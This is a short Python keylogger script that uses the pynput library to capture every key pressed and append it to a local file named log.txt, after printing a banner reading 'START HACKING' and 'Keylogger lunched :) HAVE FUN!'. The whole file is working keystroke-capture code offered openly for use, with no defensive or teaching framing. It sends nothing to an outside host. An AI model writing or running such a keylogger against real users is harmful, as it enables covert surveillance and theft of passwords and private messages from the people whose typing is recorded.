from pynput import keyboard

for i in range(20):
    print("\n")

print("WELCOME :)")

print("\n.... START HACKING:")
print("Keylogger lunched :) HAVE FUN!")


def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(f"{key.char}")
        except:
            f.write(f"{key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

